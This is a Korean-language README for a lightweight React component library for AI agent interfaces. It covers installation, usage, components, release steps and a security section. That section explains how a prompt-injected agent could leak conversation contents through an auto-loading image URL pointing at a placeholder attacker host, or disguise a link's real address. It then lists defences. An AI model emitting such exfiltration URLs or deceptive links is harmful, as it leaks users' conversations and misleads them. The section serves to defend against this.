[English](https://github.com/dusunax/design/blob/main/packages/moa/README.md) | 한국어

# @dusunax/moa

에이전트 UI를 위한 경량 React 부품 모음이다. 부품을 모아 화면을 조립한다는 뜻에서 이름을 "모아"로 지었다.

## 설치

```bash
pnpm add @dusunax/moa
```

React 19가 필요하다(`react`, `react-dom`은 peer dependency).

## 사용

스타일은 컴파일된 CSS 파일 하나다. 앱에서 한 번만 불러온다. 쓰는 쪽에 Tailwind가 없어도 되고, 페이지의 전역 스타일을 바꾸지 않는다.

```tsx
import "@dusunax/moa/styles.css";
import { Button, Text } from "@dusunax/moa";

export function Example() {
  return (
    <div data-moa-theme="dark">
      <Text text="**안녕**, moa" />
      <Button onClick={() => {}}>확인</Button>
    </div>
  );
}
```

- dark 테마는 감싼 요소에 `data-moa-theme="dark"`를 붙인다. Modal처럼 포털로 그리는 부품도 트리거 근처의 테마를 따른다.
- 부품 하나만 불러오려면 subpath를 쓴다(`@dusunax/moa/button`, `@dusunax/moa/tool-call-card`).
- 부품의 기본 문구(`Close`, `No results`, `Running` 등)는 영어다. 번역 사전은 없고, `labels`, `emptyText` 같은 문구 prop으로 바꾼다.

## 부품

| 묶음 | 부품 |
|---|---|
| 레이아웃·표시 | Row, Column, List, Card, Divider, Text, Image, Icon |
| 입력 | Button, TextField, CheckBox, DateTimeInput |
| 동작을 Radix에 맡긴 부품 | Modal, Tabs, Slider, ChoicePicker |
| 에이전트 | MessageBubble, StreamingText, RunStatus, ToolCallCard |

부품 이름, prop 이름, variant 값은 A2UI basic catalog와 같게 맞췄다. 이 패키지는 A2UI·AG-UI의 공식 구현이 아니다.

## 보안

부품이 그리는 문자열과 URL은 에이전트가 보낸 값일 수 있다. 프롬프트 인젝션을 당한 에이전트는 다음 경로로 사용자를 노릴 수 있다.

- **URL로 데이터 유출**: Image는 받은 URL을 바로 불러온다. 에이전트가 `https://attacker.example/?q=<대화 내용>` 같은 URL을 넣으면, 사용자가 아무것도 누르지 않아도 브라우저가 요청을 보낸다. Text 링크도 같은 방식이지만 클릭이 필요하다.
- **링크 글자와 실제 주소 불일치**: `[https://bank.example](https://attacker.example)`처럼 보이는 글자와 다른 주소로 이동하는 링크를 만들 수 있다. 터치 기기에서는 실제 주소를 미리 볼 방법이 없다.

`moa`는 화면을 그리는 부품이라 이 경로를 막지 않는다. 에이전트 출력을 그리는 앱에서는 다음을 둔다.

- CSP `img-src`로 이미지를 불러올 출처를 제한한다.
- Image `url`과 Text 링크 주소를 출처 허용 목록으로 걸러서 넘긴다.

`moa`가 막는 것:

- Text는 HTML을 해석하지 않는다. `<img onerror=…>`도 글자 그대로 보인다.
- Text 링크는 `http:`, `https:`, `mailto:` 주소만 링크로 만들고, 새 탭으로 열 때 `rel="noopener noreferrer"`를 붙인다.
- 문자열 prop은 모두 텍스트로 그려져 React가 이스케이프한다.

## 배포

관리자가 로컬에서 npm 계정의 2FA OTP를 넣어 배포한다. CI에는 배포 토큰을 두지 않는다.

```bash
pnpm changeset   # 변경 기록 추가
pnpm changeset version
pnpm release     # 빌드 후 npm publish, OTP 입력
```

## 라이선스

MIT. Icon의 SVG path는 [Material Symbols](https://github.com/google/material-design-icons)(Apache-2.0)에서 가져왔다.
